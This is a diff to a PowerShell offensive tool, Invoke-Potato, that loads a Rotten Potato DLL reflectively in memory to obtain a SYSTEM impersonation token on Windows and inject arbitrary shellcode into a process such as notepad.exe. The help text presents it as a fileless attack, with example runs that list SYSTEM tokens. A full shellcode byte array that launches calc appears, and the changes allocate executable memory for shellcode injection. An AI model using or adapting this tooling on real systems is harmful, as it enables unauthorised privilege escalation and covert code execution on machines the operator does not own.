@@ -1,130 +1,118 @@
-function Get-DelegateType
-{
-
-        Param
-
-        (
-
-            [OutputType([Type])]
-
-            
-
-            [Parameter( Position = 0)]
-
-            [Type[]]
-
-            $Parameters = (New-Object Type[](0)),
-
-            
-
-            [Parameter( Position = 1 )]
-
-            [Type]
-
-            $ReturnType = [Void]
-
-        )
-
-
-
-        $Domain = [AppDomain]::CurrentDomain
-
-        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
-
-        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
-
-        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
-
-        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
-
-        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
-
-        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
-
-        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
-
-        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
-
-        
-
-        Write-Output $TypeBuilder.CreateType()
-
-}
-
-function Get-ProcAddress
-{
-
-        Param
-
-        (
-
-            [OutputType([IntPtr])]
-
-        
-
-            [Parameter( Position = 0, Mandatory = $True )]
-
-            [String]
-
-            $Module,
-
-            
-
-            [Parameter( Position = 1, Mandatory = $True )]
-
-            [String]
-
-            $Procedure
-
-        )
-
-
-
-        # Get a reference to System.dll in the GAC
-
-        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
-
-            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
-
-        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
-
-        # Get a reference to the GetModuleHandle and GetProcAddress methods
-
-        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
-
-        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
-
-        # Get a handle to the module specified
-
-        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
-
-        $tmpPtr = New-Object IntPtr
-
-        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
-
-        
-
-        # Return the address of the function
-
-        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
-
-}
-$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
-$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
-$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
-$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
-$VirtualFreeDelegate = Get-DelegateType @([IntPtr], [Uint32], [UInt32]) ([Bool])
-$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
-$CreateThreadAddr = Get-ProcAddress kernel32.dll CreateThread
-$CreateThreadDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
-$CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
-$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
-$WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [Int32]) ([Int])
-$WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
-
 function Invoke-Potato
 {
-[CmdletBinding(DefaultParameterSetName="DumpCreds")]
+<#
+.SYNOPSIS
+
+Script leverages Reflective Potato and Invoke-ReflectivePEInjection to reflectively load Rotten Potato DLL directly into memory. This
+allows you to indirectly perform the Rotten Potato attack without having to touch the disk, or utilize any external loaders.
+
+The script takes a Shellcode parameter which will execute any arbitrary shellcode within the HostProc argument. Default is set to C:\Windows\System32\notepad.exe
+
+The script should work on any version of windows EXCEPT Server 2019, where the attack is currently patched.
+
+Providing no parameters will result in an impersonation token being provided in-memory to be used with external tools such as Invoke-TokenManipulation, Incognito,
+or manually impersonating with your current thread with SetThreadToken() Api call.
+
+Function: Invoke-Potato
+Author: Mumbai, Twitter: @ilove2pwn_
+Rotten Potato Author: br33nmachine. Blog: https://foxglovesecurity.com/author/br33nmachine/
+Required Dependencies: Reflective Potato (included)
+Optional Dependencies: None
+Version: 1.0
+ReflectivePotato Version: 1.0
+
+.DESCRIPTION
+
+Reflectively loads a modified Rotten Potato DLL (Reflective Potato) directly into memory using Powershell. Can be used in situations where the attacker is unable to touch the disk
+or inherently does not wish to.
+
+.PARAMETER Shellcode
+
+Switch: Inject shellcode directly into HOSTPROC as SYSTEM. Must be in the format of a Powershell bytearray.
+
+.PARAMETER HostProc
+
+Switch: Process to start as SYSTEM that the SHellcode will be injected into. Default C:\Windows\System32\notepad.exe
+
+.EXAMPLE 
+
+Execute ReflectivePotato and use the resulting impersonation token.
+PS > Invoke-Potato
+[*] Invoked main, starting Rotten Potato.
+[+] Great! Returned succesfully, calling your function now :)
+EXE args are null!
+Location of SYSTEM token => [2452]
+PS > .\incognito.exe list_tokens -u
+[-] WARNING: Not running as SYSTEM. Not all tokens will be available.
+[*] Enumerating tokens
+[*] Listing unique users found
+
+Delegation Tokens Available
+============================================
+BTH-PC5\AJH
+
+Impersonation Tokens Available
+============================================
+NT AUTHORITY\SYSTEM
+
+Administrative Privileges Available
+============================================
+SeAssignPrimaryTokenPrivilege
+SeTcbPrivilege
+SeTakeOwnershipPrivilege
+SeBackupPrivilege
+SeRestorePrivilege
+SeDebugPrivilege
+SeImpersonatePrivilege
+SeLoadDriverPrivilege
+
+PS >
+
+.EXAMPLE 
+
+Execute shellcode within a Host process notepad.exe
+
+PS > invoke-potato -Shellcode @(0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x0,0x0,0x0,0x41,0x51,0x41,0x50
+,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48
+,0xf,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0xe
+2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x8b,0x80,0x88,0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x
+67,0x48,0x1,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x1,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48
+,0x1,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8
+,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x1,0xd0,0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40,0x1c,0x49,0x1,0x
+d0,0x41,0x8b,0x4,0x88,0x48,0x1,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20
+,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x1,0x0,0x0,0x0,0x0,0x0,
+0x0,0x0,0x48,0x8d,0x8d,0x1,0x1,0x0,0x0,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0
+x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x0,
+0x59,0x41,0x89,0xda,0xff,0xd5,0x43,0x3a,0x5c,0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x5c,0x53,0x79,0x73,0x74,0x65,0x6d,0x33,
+0x32,0x5c,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x0) -HostProc C:\Windows\System32\notepad.exe
+[*] Invoked main, starting Rotten Potato.
+[+] Great! Returned succesfully, calling your function now :)
+[+] Size of shellcode 296
+[+] Host Process C:\Windows\System32\notepad.exe
+[+] Executing thread within C:\Windows\System32\notepad.exe
+0
+PS > get-process calc
+
+Handles  NPM(K)    PM(K)      WS(K) VM(M)   CPU(s)     Id ProcessName
+-------  ------    -----      ----- -----   ------     -- -----------
+     74      15     7072      11876    61            8204 calc
+     74      15     7064      11872    61            8324 calc
+
+
+PS >
+
+.NOTES 
+
+The script was created with a combination of another side project Reflective Potato + Invoke-ReflectivePEInjection. Lovely script.
+You can find the script down at https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1
+
+.LINK 
+
+MSFRottenPotato Original: https://github.com/breenmachine/RottenPotatoNG
+Reflective Potato : https://github.com/realoriginal/reflectivepotato
+Invoke-ReflectivePEInjection : https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1
+#>
+
 Param(
     [Parameter(Mandatory = $false)]
     [String[]]
@@ -141,6 +129,22 @@ Param(
 
 Set-StrictMode -Version 2
 
+
+$functions = @"
+using System;
+using System.Collections.Generic;
+using System.Runtime.InteropServices;
+namespace Windows 
+{
+
+	public static class Functions
+	{
+
+		[DllImport("kernel32.dll")]
+		public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+	}
+}
+"@
 
 $RemoteScriptBlock = {
     [CmdletBinding()]
@@ -2709,6 +2713,7 @@ $RemoteScriptBlock = {
                         Write-Output "Location of SYSTEM token => [$OutputPtr]"
                     }
 	    } else {
+		    Add-Type -TypeDefinition $functions -Language CSHARP 
                     Write-Verbose "Calling function with shellcode execution"
 	            [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "ShellcodeFunc"
 	            if ($StringFuncAddr -eq [IntPtr]::Zero)  
@@ -2716,12 +2721,10 @@ $RemoteScriptBlock = {
 			 Throw "Couldn't find function address."
 	            }
 		    $StringFuncDelegate = Get-DelegateType @([IntPtr], [Int], [IntPtr]) ([IntPtr])
-		    $BaseAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40)
+		    $BaseAddress = [Windows.Functions]::VirtualAlloc([IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40)
                     [System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $BaseAddress, $Shellcode.Length)
                     $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
 		    $HostProcArg = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($HostProc)
-                    Write-Verbose "PRESS ENTER TO INVOKE DAMNT"
-		    [void][System.Console]::ReadKey($true)
 		    Write-Verbose "Location of Bytecode => $BaseAddress"
 	            $StringFunc.Invoke($BaseAddress, $Shellcode.Length, $HostProcArg)
             }
@@ -2766,7 +2769,6 @@ Function Main
         echo "EXE args are null!"
 	$ExeArgs = $null
     } else {
-        echo "REEEE"
 	$ExeArgs = [System.Text.Encoding]::ASCII.GetString($Shellcode); 
     }
 
